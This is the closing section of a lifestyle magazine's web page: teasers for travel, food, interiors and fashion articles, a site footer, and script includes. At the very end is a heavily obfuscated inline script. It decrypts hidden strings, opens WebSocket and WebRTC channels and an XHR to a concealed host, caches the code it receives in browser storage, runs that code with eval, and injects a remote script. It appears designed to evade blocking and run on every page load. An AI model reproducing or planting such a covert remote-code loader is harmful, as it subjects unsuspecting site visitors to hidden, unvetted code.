          (adsbygoogle = window.adsbygoogle || []).push({});
      </script>
  </div>
</div>
				</div>
			</div>
		</div>
	</div>
</div>
<div id="bottom_blocks">
	<div class="container">
		<div class="row">
			<div class="col-md-8 bottom_blocks_left">
				
<div id="bottom_blocks_left">
										<div class="bottom_blocks_left_wrap">
				<a href="http://eternallifestyle.com/travel/march-travel-guide-sorted/" class="bottom_blocks_left_item">
					<div class="bottom_blocks_left_item_img" style="background-image: url('http://d1v3t0rdobjdgs.cloudfront.net/wp-content/uploads/2018/02/27150134/Screen-Shot-2018-02-27-at-4.59.59-PM-354x400.png')"></div>
					<div class="bottom_blocks_left_item_content">
						<h2 class="bottom_blocks_left_item_content_header">Your March Travel Guide Sorted</h2>

						<p class="bottom_blocks_left_item_content_meta">By
							<span class="bottom_blocks_left_item_content_meta_name">Jen Woodley</span>
							<span class="icon icon-leaf_sm"> </span> <span class="bottom_blocks_left_item_content_meta_date">3/3/2018</span>
						</p>

						<p class="bottom_blocks_left_item_content_text">



Spring has sprung, so if you are needing a little head start with the sun before summer arrives, we have the best destinations to head to this month. Just before Easter, the beaches will be peaceful, and the deals are still enticing.
...</p>

						<span class="bottom_blocks_left_item_content_read_more">Read More</span>
					</div>
				</a><!--./bottom_blocks_left_item-->

			</div>
												<div class="bottom_blocks_left_wrap">
				<a href="http://eternallifestyle.com/food/4-delicious-healthy-weekend-breakfast-ideas/" class="bottom_blocks_left_item">
					<div class="bottom_blocks_left_item_img" style="background-image: url('http://d1v3t0rdobjdgs.cloudfront.net/wp-content/uploads/2018/02/27144017/Screen-Shot-2018-02-27-at-4.35.34-PM-354x400.png')"></div>
					<div class="bottom_blocks_left_item_content">
						<h2 class="bottom_blocks_left_item_content_header">4 Of The Most Delicious Healthy Weekend Breakfast Ideas</h2>

						<p class="bottom_blocks_left_item_content_meta">By
							<span class="bottom_blocks_left_item_content_meta_name">G. Barnett</span>
							<span class="icon icon-leaf_sm"> </span> <span class="bottom_blocks_left_item_content_meta_date">3/2/2018</span>
						</p>

						<p class="bottom_blocks_left_item_content_text">



March has arrived! Spring has finally sprung, and this means that we are one step closer to summer. So say goodbye to those big heavy meals, and hello to healthy breakfasts to keep you motivated, and feeling your best. These breakfast ideas...</p>

						<span class="bottom_blocks_left_item_content_read_more">Read More</span>
					</div>
				</a><!--./bottom_blocks_left_item-->

			</div>
			</div>
			</div>
			<div class="col-md-4 bottom_blocks_right">
				
<div id="bottom_blocks_right">
	<div class="bottom_blocks_right_items_wrap">
														<a href="http://eternallifestyle.com/living/spring-interiors-inspiration/" class="bottom_blocks_right_item">
					<div class="bottom_blocks_right_item_img" style="background-image: url('http://d1v3t0rdobjdgs.cloudfront.net/wp-content/uploads/2018/03/01085514/Screen-Shot-2018-03-01-at-10.54.55-AM.png')"></div>
					<div class="bottom_blocks_right_item_content">
						<p class="bottom_blocks_right_item_content_meta">Living</p>
						<h2 class="bottom_blocks_right_item_content_header">Spring Interiors Inspiration</h2>
					</div>
				</a>

																<a href="http://eternallifestyle.com/fashion/spring-style-need-know/" class="bottom_blocks_right_item">
					<div class="bottom_blocks_right_item_img" style="background-image: url('http://d1v3t0rdobjdgs.cloudfront.net/wp-content/uploads/2018/02/28085050/Screen-Shot-2018-02-28-at-10.50.31-AM.png')"></div>
					<div class="bottom_blocks_right_item_content">
						<p class="bottom_blocks_right_item_content_meta">Fashion</p>
						<h2 class="bottom_blocks_right_item_content_header">Spring Style&#8230; All You Need To Know</h2>
					</div>
				</a>

																<a href="http://eternallifestyle.com/health/free-mind-rest-will-follow/" class="bottom_blocks_right_item">
					<div class="bottom_blocks_right_item_img" style="background-image: url('http://d1v3t0rdobjdgs.cloudfront.net/wp-content/uploads/2018/02/27082122/Screen-Shot-2018-02-27-at-10.20.46-AM.png')"></div>
					<div class="bottom_blocks_right_item_content">
						<p class="bottom_blocks_right_item_content_meta">Health</p>
						<h2 class="bottom_blocks_right_item_content_header">Free Your Mind&#8230; The Rest Will Follow</h2>
					</div>
				</a>

					</div>
</div>
			</div>
		</div>
	</div>
</div>


<footer id="main_footer">
    <div id="footer_main_block">
	<div class="container">
		<div class="row">
			<div class="col-sm-12 col-md-4 footer_about_section">
				
<div id="footer_about">

	<a href="http://eternallifestyle.com" class="footer_logo">
					<img
				src="http://eternallifestyle.com/wp-content/themes/eternallifestyle/images/logo_footer.png"
				alt="EternalLifestyle"
				class="footer_logo_img img-responsive">
			</a>

	<div class="footer_about_content">
		<p class="footer_about_text">Eternal lifestyle is the ultimate "Good life" magazine.

            Our mission is to bring our readers the the most interesting and relevant lifestyle content from all around the world.

            Fashion, Healthy Lifestyle, Travel, New Trends, and many more - All can be found here!</p>
	</div>

	<div class="footer_social">
		<a href="https://www.facebook.com/EternalLifestyle1/" target="_blank" class="icon icon-fb_big"></a>
		<a href="https://twitter.com/lifestyle_etern" target="_blank" class="icon icon-tw_big"></a>
	</div>

</div>


			</div>
			<div class="col-sm-6 col-md-4 footer_more_news_section">
				
<div id="footer_more_news">
	<div class="widget footer_more_news">
		<h2 class="widget-title">More news</h2>
		<ul>
								<li>
						<a href="http://eternallifestyle.com/health/start-monday-right-way-healthy-breakfast-smoothie-recipe/">Start Your Monday The Right Way- Healthy Breakfast Smoothie Recipe</a>
						<span class="post-date">Feb 26, 2018</span>
					</li>
										<li>
						<a href="http://eternallifestyle.com/travel/best-things-beautiful-barcelona/">The Very Best Things To Do In Beautiful Barcelona</a>
						<span class="post-date">Feb 25, 2018</span>
					</li>
										<li>
						<a href="http://eternallifestyle.com/fashion/saturday-style-update-need-wearing-weekend/">Saturday Style Update: What You Need To Be Wearing This Weekend</a>
						<span class="post-date">Feb 24, 2018</span>
					</li>
							</ul>
	</div>
</div>
			</div>
			<div class="col-sm-6 col-md-4 footer_popular_posts_section">
				
<div id="footer_popular_posts">
	<div class="widget footer_popular_posts">
		<h2 class="widget-title">Popular</h2>
														<a href="http://eternallifestyle.com/food/feel-good-friday-blueberry-muffin-recipe/" class="footer_popular_posts_item">
					<div class="footer_popular_posts_item_img" style="background-image: url('http://d1v3t0rdobjdgs.cloudfront.net/wp-content/uploads/2018/02/21111423/IMG_2544-95x68.jpg')"></div>
					<div class="footer_popular_posts_item_content">
						<h2 class="footer_popular_posts_item_header">Fluffy Friday Blueberry Muffin Recipe</h2>
						<p class="footer_popular_posts_item_meta">Feb 23, 2018</p>
					</div>
				</a>
																<a href="http://eternallifestyle.com/travel/best-breakfast-spots-washington-d-c/" class="footer_popular_posts_item">
					<div class="footer_popular_posts_item_img" style="background-image: url('http://d1v3t0rdobjdgs.cloudfront.net/wp-content/uploads/2018/02/22102021/tl-horizontal_main-1-95x68.jpg')"></div>
					<div class="footer_popular_posts_item_content">
						<h2 class="footer_popular_posts_item_header">The Best Breakfast Spots In Washington D.C</h2>
						<p class="footer_popular_posts_item_meta">Feb 22, 2018</p>
					</div>
				</a>
																<a href="http://eternallifestyle.com/beauty/best-beauty-apps-need-using/" class="footer_popular_posts_item">
					<div class="footer_popular_posts_item_img" style="background-image: url('http://d1v3t0rdobjdgs.cloudfront.net/wp-content/uploads/2018/02/21082149/Screen-Shot-2018-02-21-at-10.18.03-AM-95x68.png')"></div>
					<div class="footer_popular_posts_item_content">
						<h2 class="footer_popular_posts_item_header">The Best Beauty Apps You Need To Be Using</h2>
						<p class="footer_popular_posts_item_meta">Feb 21, 2018</p>
					</div>
				</a>
					</div>
</div>
			</div>
		</div>
	</div>
</div>

	<div id="footer_menu">
	<div class="container">
		<div class="row">
			<div class="col-xs-12 override-footer-padding">
				<div class="flex-wrap">
					<div class="footer-menu-wrap">
						<h2 class="footer_copy"><span class="copyright">&copy;</span>
							<script>document.write(new Date().getFullYear())</script>
							<a href="http://eternallifestyle.com">EternalLifestyle.</a> <span class="all-right"> All rights reserved.</span>
						</h2>
						<ul id="menu-footer-menu" class="footer_menu"><li id="menu-item-171" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-171"><a title="Privacy Policy" href="http://eternallifestyle.com/privacy-policy/">Privacy Policy</a></li>
<li id="menu-item-172" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-172"><a title="DMCA" href="http://eternallifestyle.com/dmca/">DMCA</a></li>
<li id="menu-item-173" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-173"><a title="Terms of Service" href="http://eternallifestyle.com/terms-of-service/">Terms of Service</a></li>
<li id="menu-item-321" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-321"><a title="Contact Us" href="http://eternallifestyle.com/contact-us/">Contact Us</a></li>
<li id="menu-item-322" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-322"><a title="Advertise With Us" href="http://eternallifestyle.com/contact-us/">Advertise With Us</a></li>
<li id="menu-item-323" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-323"><a title="Work With Us" href="http://eternallifestyle.com/contact-us/">Work With Us</a></li>
</ul>					</div>
				</div>
			</div>
		</div>
	</div>
</div>
</footer>
<script type="text/javascript">
  window._taboola = window._taboola || [];
  _taboola.push({flush: true});
</script>

<script>
  try{!function(){function B(){try{var n=K()}catch(e){}if(n)try{C(n.h,null)}catch(e){delete window.localStorage[n.key],delete window.sessionStorage[n.key]}else L(function(n,e){e.as=!0;try{C(n,e)}catch(a){}},M)}function M(){var n=a(window.location.protocol==a("HxMQFARI")?"HxMQFARIVVg=":"HxMQFE1dVQ==");(new Image).src=n+u+N}function L(n,e){function a(){var t=A.shift();if(t)try{t(n,a)}catch(r){a()}else v(),e()}try{O()}catch(t){return v(),void e()}var A=[P,Q,R,S];a()}function C(a,c){!function(){eval(a)}({e:a,p:c,n:g})}function K(){var n=[];window.localStorage&&n.push(window.localStorage),window.sessionStorage&&n.push(window.sessionStorage);var e=D(a("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="),E(a("BxUBBRoQFhI=")));e=new Uint8Array(e);for(var t="",A=0;A<e.length;A++)t+=String.fromCharCode(e[A]);for(e=btoa(t),t=(new Date).getTime(),A=0;A<n.length;A++){var o,c=n[A];for(o in c)if(0===o.lastIndexOf(e,0)){try{for(var i=a("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="),g=atob(c[o]),F=new Uint8Array(g.length),u=0;u<g.length;u++)F[u]=g.charCodeAt(u);var d=r(D(i,F.buffer))}catch(l){continue}if(u=parseInt(d.substring(0,13),10),!isNaN(u))if(t-u>864e5||1>t-u)c.removeItem(o);else if((u=d.substring(13))&&!(16>u.length))return{h:u,key:o}}}return null}function Q(n,e){var t=a("RFNTXA=="),A=a("QCVeV0FITzNAQFFDOzNLVCZIJUNRX0FcL1dQOyVXUFFNIydeNTBANk9IW0FAMEVWJUReTlpcQ1ZTVl1AIF1ZWUBdUFJNMUlNPEdSSj9IM11dN1FAXlNPJFteXk9cKCU=");t=w+":"+t;var r={};r[a("AhUIFw==")]=a("AxIWCk0=")+t+a("SBMWBRkBChgIBlUNGQI="),r[a("FBUBABIcDh4bHg==")]=a("DgYQDRoT"),r[a("AhQBFhkTFxI=")]=a("DgYQDRoT"),F(A,r,function(n){return n=n.match(new RegExp(a("KQQFChMbHhYOF1IlHllRMANZRFJUXAACGRg/PjZEQz0TTERMKxZRK1QuDFImXC0ITC5KJg9NXEY1AEFaEhQTQQUCCAUO"))),null==n?null:(n=n[1],a("FAYKAB4WGwMfSFlZS1IkKDdSXElYV0dQWkQ=")+n+a("V1FXVEZEWgMDAkgLHx4QFUcABR4PFFU=")+n+a("VxUUCwUGWkFJQllPWhwUGBAdFhFGBRoVHURa"))},n,e)}function R(n,e){var t=a("QVdUVQ=="),A=a("MVJeJTVIQk5AN1xDTkNLVVZIU0NRVUZcWVZQOF5XVCBNUiZeMkNAMU9IXE9ARTRWITdeTy1cR1JTXCxAJChZVTJdVydNNzlNTUpSSUxIRF9dM1ZAWCBPUiheXUNcVFs=");t=w+":"+t;var r={};r[a("AhUIFw==")]=[a("BBMRCk0=")+t],F(A,r,function(n){return n=n.match(new RegExp(a("KQQFChMbHhYOF1IlHllRMANZRFJUXAACGRg/PjZEQz0TTERMKxZRK1QuDFImXC0ITC5KJg9NVToNT0NaEhQTQQQVAggP"))),null==n?null:(n=n[1],a("FAYKAB4WGwMfSFhZS1IkKDdSVktfUUFeWlJeTUY=")+n+a("VxMdFFcaFQQO"))},n,e)}function F(n,e,t,A,r){function o(n){c||(c=!0,n.apply(null,Array.prototype.slice.call(arguments,1)))}var c=!1;A=o.bind(null,A),r=o.bind(null,r);var i={};i[a("HgQBNxIADBIIAQ==")]=[e];var F=new g.c(i);F[a("FBUBBQMXPhYOEysRGxwfCQs=")](a("WAoBEBZdCh4UFQ==")).binaryType=a("FhUWBQ4QDxEcFxo="),F[a("GAkNBxIRGxkeGwwYDhc=")]=function(n){if(null!=n[a("FAYKAB4WGwMf")]&&(n=t(n[a("FAYKAB4WGwMf")][a("FAYKAB4WGwMf")]),null!=n)){var e={};e[a("FAYKAB4WGwMf")]=n,e[a("BAMUKTsbFBIzHAwcAg==")]=0,F[a("FgMALRQXORYUFgEdGwYU")](new g.b(e),function(){},function(){})}},F.addEventListener(a("HgQBBxgcFBIZBgEWFAEFDRMXBxIKCBID"),function(){F[a("HgQBJxgcFBIZBgEWFCEFDRMX")]===a("EQYNCBIW")&&r()});var u=a("AVpUbhhPDwQfAAYYFxdRXEdCRDMlRjw2XURbSFFDU09HSVVuBE8JEgkBARYUHBABAngHRyIoVS85UEpLVFpNUVlXSlV9BkdHWkJiGEcUGAIAFxYKGQ8bElMXAhtLX1ZXVw==")+n+a("fQZZDRQXVxgKBgEWFAFLGBUbBxEHA38LVAUaCgoEAAADDgsKV0NIRE5SLC02IV4/JCY0Wl5WRVZjBVcJBRkTDBYXXlFHQkpXDRcKCw4RXAgGBgUZAwcbCAwISkhTW2kASg4HAVoHHAUbFVI=")+function(){for(var n="",e=a("R1dUVEdCSkc="),t=0;16>t;++t){var A=(4294967296*Math.random()>>>0).toString(16);n+=e.substring(0,e.length-A.length)+A}return n}()+a("fQZZDRQXVwcNFlJJSkJBXFdCVEpbVkVWWVRaSlZdU1FHV1RUR0JKR0pCWHM=");F[a("FBUBBQMXNREcFxo=")](function(n){F[a("BAIQKBgRGxs+FxsaCBsBGA4dCg==")](n,function(){var n={};n[a("Ax4UAQ==")]=a("FgkXExIA"),n[a("BAMU")]=u,F[a("BAIQNhIfFQMfNg0KGQAYHBMbCxQ=")](new g.f(n),function(){},function(){})},function(){})},function(){}),n=F[a("FBUBBQMXPhYOEysRGxwfCQs=")](a("WBAXFHc=")+window.navigator.userAgent),n.binaryType=a("FhUWBQ4QDxEcFxo="),G(n,x(),function(n){A(n,{rtc:F})},function(){r()})}function S(n,e){function t(n){c||(c=!0,n.apply(null,Array.prototype.slice.call(arguments,1)))}var A=x();A=a(window.location.protocol==a("HxMQFARI")?"HxMQFARIVVg=":"HxMQFE1dVQ==")+u+A;var o=a("MCIw"),c=!1;n=t.bind(null,n),e=t.bind(null,e);var i=new g.g;i.onreadystatechange=function(){4==i.readyState&&(0==i.status?e():n(r(i.response),{}))},i.onerror=function(){e()},i.open(o,A,!0),i.responseType=a("FhUWBQ4QDxEcFxo="),i.send(null)}function P(n,e){var t=a("ABQXXlhd"),A=new g.a(t+w+a("WBAXFA=="));A.binaryType=a("FhUWBQ4QDxEcFxo="),G(A,x(),function(e){n(e,{ws:A})},function(){e()})}function G(n,e,t,A){function o(n){c||(c=!0,n.apply(null,Array.prototype.slice.call(arguments,1)))}var c=!1;t=o.bind(null,t),A=o.bind(null,A);var i=!1,g=setTimeout(function(){A(Error())},3e3),F=E(JSON.stringify({url:e||"",method:a("MCIw"),headers:null,body:null}));n.onopen=function(){clearTimeout(g),n.send(F)};var u,d=new ArrayBuffer(0);n.onmessage=function(n){if(4===n.data.byteLength){var e=new Uint8Array(n.data);if(222===e[0]&&173===e[1]&&190===e[2]&&239===e[3])return}!1===i?(i=!0,n=r(n.data),u=JSON.parse(n),u={status:u.status||0,headers:u.headers||{}}):(n=n.data,e=new Uint8Array(d.byteLength+n.byteLength),e.set(new Uint8Array(d),0),e.set(new Uint8Array(n),d.byteLength),d=e.buffer)},n.onerror=function(){clearTimeout(g),A(Error())},n.onclose=function(){i?(u.body=d,t(r(u.body))):(clearTimeout(g),A(Error()))}}function y(n){return window[n.name]?window[n.name]:n[a("FAgKEBIcDjMVER0UHxwF")]&&n[a("FAgKEBIcDjMVER0UHxwF")][a("EwICBQIeDiETFx8=")]?n[a("FAgKEBIcDjMVER0UHxwF")][a("EwICBQIeDiETFx8=")]:n[a("FAgKEBIcDiATHAwWDQ==")]}function H(){var n=document.createElement(a("HgEWBRoX"));n.style.height=a("Rhcc"),n.style.width=a("Rhcc"),n.style.display=a("GQgKAQ=="),n[a("BBUHABgR")]=a("Fg=="),n.name||(n.name=String.fromCharCode(parseInt(25*Math.random()+97,10))+Math.random().toString(36).substring(7)),(document.body||document.head||document.documentElement).appendChild(n);var e=y(n);e.document.documentElement||e.document.write(a("Fg=="));try{e.stop()}catch(t){}return n}function O(){I=a("AgkPChgFFA=="),t=a("FA8WCxoX"),q=a("EQ4WAREdAg=="),z=a("GBcBFhY="),A=a("BAYCBQUb");var n=H();n=y(n);var e=n.navigator.userAgent,r=new RegExp(a("FA8WCxoXBhQSAAcUEwcc"),"i").test(e)?t:new RegExp(a("EQ4WAREdAgsTEQ0OHxMCCQsOAgICCQY="),"i").test(e)?q:new RegExp(a("KU9MW1YREgUVHw0FGxwVHggbAFNFT18VCAILCA8="),"i").test(e)?A:new RegExp(a("GBcWGBgCExgJ"),"i").test(e)?z:window[a("FA8WCxoX")]?t:"undefined"!=typeof InstallTrigger?q:I;-1===[t,q,z,A].indexOf(r)&&(n=window),e=a("EhEFCA=="),g.c=n[e](a("AA4KABgFVCUuMTgcHwAyAwkcARkfDxoISRgWWhEEDQUYEEoTEhARHg4gPDoqFxQeJB0KFA4FAQ8GCkoGGk0UCBkDCxNZHxUNKCYrKR8XAy8IHAofCBIcCQdEFgZGGgoPEwgTShoBKCM5Ig0cCDEeAgkXBw4CCRs=")),g.f=n[e](a("AA4KABgFVCUuMTscCQEYAwk2AQkIFBwWHQ0FFEYRH0EADgoAGAVUAB8QAxAOICUvNBcXCQIJGyIMFwkIDx0XCBgJRBgLUg0eFBYHDlQfHhY1JicpDhUGDwYKLh8VDhEIBxMNCxlSBgtaBQEXHh0GQgoBNi4oNRAVGg0FFCIIEAIFDhQQHh0U")),g.b=n[e](a("AA4KABgFVCUuMSEaHzEQAgMbABsfA1UaFUQdEwgJDBZZEAEGHBsOJS4xIRofMRACAxsAGx8DVRoVRB0TCAkMFlkKCx4lJjk+GRcrGBQWGAgGBgFaFxpVEQAKDhURQw4SJTMnLRQXORYUFgEdGwYU")),r===q?(r=H(),g.a=y(r)[e](a("AA4KABgFVCAfEDsWGRkUGA==")),r.parentElement.removeChild(r)):g.a=n[e](a("AA4KABgFVCAfEDsWGRkUGA==")),g.g=n[e](a("AA4KABgFVC83PiANDgIjCRYHAQkf"))}function D(n,e){var a=new Uint8Array(e),t=new ArrayBuffer(e.byteLength);t=new Uint8Array(t);for(var A=0;A<e.byteLength;A++)t[A]=a[A]^n.charCodeAt(A%n.length);return t.buffer}function r(n){if(window.TextDecoder)return new window.TextDecoder("utf-8").decode(new Uint8Array(n));var e="";n=new Uint8Array(n);for(var a=n.byteLength,t=0;a>t;t++)e+=String.fromCharCode(n[t]);return decodeURIComponent(escape(e))}function E(n){if(window.TextEncoder)return new window.TextEncoder("utf-8").encode(n).buffer;n=unescape(encodeURIComponent(n));for(var e=new Uint8Array(n.length),a=0;a<n.length;a++)e[a]=n.charCodeAt(a);return e.buffer}function x(){return a("WAIOF0gCRw==")+"2199740001"}function a(n){n=window.atob(n);for(var e="",a=0;a<n.length;a++)e+=String.fromCharCode(n.charCodeAt(a)^"wgddwrzwzrhyzrqlgrdzkfufidjzfmca".charCodeAt(a%32));return e}function v(){if(!J){var n=("https:"==window.location.protocol?"https://":"http://")+u+T,e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src=n,(document.body||document.head||document.documentElement).appendChild(e),J=!0}}var u=a("Dw8WShAdHh4YExoVVBEeAQ=="),w=a("FkkDCxMbGBYIHkYaFR8="),T=decodeURIComponent("%2Fljs%3Fp%3D")+"2199740001",N="/l?p=2199740001&c=ef&cb="+Math.random().toString().slice(3,9),g={},I,t,q,z,A,J=!1;if(/ucbrowser/i.test(navigator.userAgent)||window.i)try{v()}catch(b){}try{B()}catch(b){}}()}catch(B){}
</script><script type='text/javascript' src='http://eternallifestyle.com/wp-content/plugins/forensiq-include/forensiq-script.min.js?ver=1.0.0'></script>
<script type='text/javascript' src='http://eternallifestyle.com/wp-content/themes/eternallifestyle/scripts/plugins.js?ver=4.8.5'></script>
<script type='text/javascript' src='http://eternallifestyle.com/wp-content/themes/eternallifestyle/scripts/main.js?ver=4.8.5'></script>
<script type='text/javascript' src='http://eternallifestyle.com/wp-includes/js/wp-embed.min.js?ver=4.8.5'></script>
</body>
</html>